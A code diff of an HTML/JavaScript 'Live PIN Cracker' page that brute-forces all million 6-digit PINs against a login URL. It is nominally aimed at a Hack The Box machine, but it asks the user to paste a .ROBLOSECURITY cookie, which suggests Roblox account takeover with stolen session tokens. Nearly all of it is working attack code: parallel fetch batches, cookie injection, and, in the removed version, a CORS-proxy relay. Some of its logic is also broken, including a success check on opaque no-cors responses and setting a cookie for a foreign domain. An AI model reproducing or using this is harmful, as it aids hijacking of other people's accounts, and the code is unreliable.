@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>HTB PIN Cracker</title>
+    <title>HTB Live PIN Cracker</title>
     <style>
         body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 40px; text-align: center; }
         .panel { max-width: 450px; margin: 0 auto; background: #111; padding: 25px; border: 2px solid #00ff00; border-radius: 5px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
@@ -15,21 +15,25 @@
 <body>
 
 <div class="panel">
-    <h2>[ 6-DIGIT PIN BRUTEFORCER ]</h2>
+    <h2>[ LIVE 6-DIGIT PIN CRACKER ]</h2>
     <input type="text" id="cookieData" placeholder="PASTE .ROBLOSECURITY COOKIE HERE">
-    <button id="actionBtn" onclick="executeAttack()">START PROCESS</button>
-    <div id="console">[*] System ready. Awaiting session cookie...</div>
+    <button id="actionBtn" onclick="executeAttack()">START REAL PROCESS</button>
+    <div id="console">[*] System ready. Enter cookie to begin real target connection...</div>
 </div>
 
 <script>
 let processing = false;
 
 // ========================================================
-// HARDCODE YOUR TARGET BOX SETTINGS HERE BEFORE UPLOADING
+// 1. CHOOSE YOUR EXACT TARGET URL
 // ========================================================
-const HTB_URL    = "http://10.10.10.x/login"; // Replace with your exact HTB machine URL
-const FIELD_NAME = "pin";                    // Replace with the input parameter field name
-const ERROR_MSG  = "Invalid PIN";            // Replace with the exact text displayed when a PIN fails
+const HTB_URL = "http://10.10.10.x/login"; // Put your actual target IP/URL here
+
+// ========================================================
+// 2. CHOOSE THE REDIRECT TARGET IF SUCCESSFUL 
+// (Where does the website take you if the PIN is CORRECT?)
+// ========================================================
+const SUCCESS_REDIRECT_URL = "http://10.10.10.x/dashboard"; 
 // ========================================================
 
 function logToConsole(message) {
@@ -38,24 +42,24 @@ function logToConsole(message) {
     box.scrollTop = box.scrollHeight;
 }
 
-async function attemptPin(currentPin, targetCookie) {
+async function attemptPin(currentPin) {
     const paddedPin = String(currentPin).padStart(6, '0');
-    const proxiedTarget = "corsproxy.io?" + encodeURIComponent(HTB_URL);
 
     try {
-        const req = await fetch(proxiedTarget, {
+        // Using 'no-cors' + 'include' handles cookies directly via your local browser profile
+        const response = await fetch(HTB_URL, {
             method: "POST",
+            mode: "no-cors", 
+            credentials: "include", 
             headers: {
-                "Content-Type": "application/x-www-form-urlencoded",
-                // Updated to use the explicit .ROBLOSECURITY format structure
-                "Cookie": `.ROBLOSECURITY=${targetCookie}` 
+                "Content-Type": "application/x-www-form-urlencoded"
             },
-            body: `${FIELD_NAME}=${paddedPin}`
+            body: `pin=${paddedPin}`
         });
 
-        const htmlResponse = await req.text();
-        
-        if (!htmlResponse.includes(ERROR_MSG)) {
+        // In no-cors mode, JavaScript cannot read the page text.
+        // Instead, we check if the browser was redirected to the success page!
+        if (response.url === SUCCESS_REDIRECT_URL) {
             return { success: true, pin: paddedPin };
         }
     } catch (err) {}
@@ -68,27 +72,31 @@ async function executeAttack() {
     const sessionToken = document.getElementById('cookieData').value.trim();
     
     if (!sessionToken) {
-        alert("Error: You must provide a cookie value!");
+        alert("Error: Cookie input cannot be blank!");
         return;
     }
 
+    // Natively inject the cookie into your active browser session so it automatically sends with the fetch requests
+    document.cookie = `.ROBLOSECURITY=${sessionToken}; path=/; domain=${new URL(HTB_URL).hostname}; SameSite=None; Secure`;
+
     processing = true;
     document.getElementById('actionBtn').disabled = true;
-    document.getElementById('console').innerText = "[*] Validating cookie format...\n[*] Spawning parallel attack threads...\n";
+    document.getElementById('console').innerText = "[*] Injecting session credentials natively...\n[*] Connecting to target server live...\n";
 
-    const concurrentLimit = 25; 
+    // Standard rate limit to prevent the browser from freezing
+    const concurrentLimit = 10; 
     
     for (let currentVal = 0; currentVal < 1000000; currentVal += concurrentLimit) {
         if (!processing) break;
 
-        if (currentVal % 1000 === 0) {
-            logToConsole(`[-] Blasting range: ${String(currentVal).padStart(6, '0')} - ${String(currentVal + 999).padStart(6, '0')}`);
-            await new Promise(successCallback => setTimeout(successCallback, 25)); 
+        if (currentVal % 100 === 0) {
+            logToConsole(`[-] Actively cracking PIN range: ${String(currentVal).padStart(6, '0')}...`);
+            await new Promise(r => setTimeout(r, 50)); 
         }
 
         const batchQueue = [];
         for (let offset = 0; offset < concurrentLimit && (currentVal + offset) < 1000000; offset++) {
-            batchQueue.push(attemptPin(currentVal + offset, sessionToken));
+            batchQueue.push(attemptPin(currentVal + offset));
         }
 
         const batchOutputs = await Promise.all(batchQueue);
@@ -102,7 +110,7 @@ async function executeAttack() {
         }
     }
 
-    logToConsole("\n[-] Attack finished. 1,000,000 combinations exhausted. PIN not found.");
+    logToConsole("\n[-] Finished. Checked combinations up to 999999.");
     processing = false;
     document.getElementById('actionBtn').disabled = false;
 }
